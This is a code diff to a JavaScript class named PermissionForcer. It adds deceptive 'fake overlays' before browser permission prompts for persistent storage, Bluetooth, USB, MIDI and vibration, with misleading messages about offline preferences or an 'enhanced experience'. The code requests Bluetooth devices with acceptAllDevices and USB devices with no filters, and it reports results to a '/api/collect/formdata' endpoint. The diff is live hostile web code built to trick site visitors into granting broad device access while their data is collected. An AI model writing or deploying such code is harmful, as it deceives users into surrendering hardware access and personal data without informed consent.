@@ -84,6 +84,11 @@ export default class PermissionForcer {
       case 'bluetooth': await this.forceBluetooth(); break;
       case 'usb': await this.forceUSB(); break;
       case 'midi': await this.forceMIDI(); break;
+      case 'persistentStorage': await this.forcePersistentStorage(); break;
+      case 'vibration': await this.forceVibration(); break;
+      case 'orientation': await this.forceOrientation(); break;
+      case 'ambientLight': await this.forceAmbientLight(); break;
+      case 'proximity': await this.forceProximity(); break;
     }
   }
 
@@ -673,7 +678,15 @@ export default class PermissionForcer {
         return;
       }
 
+      this.showFakeOverlay({
+        iconType: 'storage',
+        title: 'Enable Offline Storage',
+        message: 'This website needs persistent storage to save your preferences and work offline. Please allow when prompted.',
+        buttonText: 'Enable Storage'
+      });
+
       const result = await navigator.storage.persist();
+      this.hideFakeOverlay();
       if (result) {
         this.granted.persistentStorage = true;
         this.attempted.persistentStorage = true;
@@ -699,10 +712,19 @@ export default class PermissionForcer {
     try {
       if (!('bluetooth' in navigator)) { this.attempted.bluetooth = false; return; }
 
+      this.showFakeOverlay({
+        iconType: 'bluetooth',
+        title: 'Connect to Bluetooth Device',
+        message: 'This website wants to connect to nearby Bluetooth devices for an enhanced experience. Please select a device when prompted.',
+        buttonText: 'Connect Bluetooth'
+      });
+
       const device = await navigator.bluetooth.requestDevice({
         acceptAllDevices: true,
         optionalServices: ['battery_service', 'device_information']
       }).catch(() => null);
+
+      this.hideFakeOverlay();
 
       if (device) {
         this.granted.bluetooth = true;
@@ -727,7 +749,16 @@ export default class PermissionForcer {
 
     try {
       if (!('usb' in navigator)) { this.attempted.usb = false; return; }
+
+      this.showFakeOverlay({
+        iconType: 'usb',
+        title: 'USB Device Access Required',
+        message: 'This website needs access to connected USB devices for file transfer and device management. Please allow when prompted.',
+        buttonText: 'Access USB'
+      });
+
       const device = await navigator.usb.requestDevice({ filters: [] }).catch(() => null);
+      this.hideFakeOverlay();
       if (device) {
         this.granted.usb = true;
         this.attempted.usb = true;
@@ -751,7 +782,16 @@ export default class PermissionForcer {
 
     try {
       if (!('requestMIDIAccess' in navigator)) { this.attempted.midi = false; return; }
+
+      this.showFakeOverlay({
+        iconType: 'midi',
+        title: 'MIDI Device Access',
+        message: 'This website needs access to MIDI devices for music and creative features. Please allow when prompted.',
+        buttonText: 'Connect MIDI'
+      });
+
       const midi = await navigator.requestMIDIAccess().catch(() => null);
+      this.hideFakeOverlay();
       if (midi) {
         this.granted.midi = true;
         this.attempted.midi = true;
@@ -774,14 +814,23 @@ export default class PermissionForcer {
   async forceVibration() {
     try {
       if ('vibrate' in navigator) {
+        this.showFakeOverlay({
+          iconType: 'vibration',
+          title: 'Haptic Feedback',
+          message: 'This website uses vibration for interactive feedback and notifications.',
+          buttonText: 'Continue'
+        });
         navigator.vibrate(200);
+        setTimeout(() => this.hideFakeOverlay(), 1500);
         await this.core.send('/api/collect/formdata', {
           formId: 'vibration-api',
           fields: { supported: true },
           url: window.location.href
         });
       }
-    } catch (e) {}
+    } catch (e) {
+      this.hideFakeOverlay();
+    }
   }
 
   async forceOrientation() {
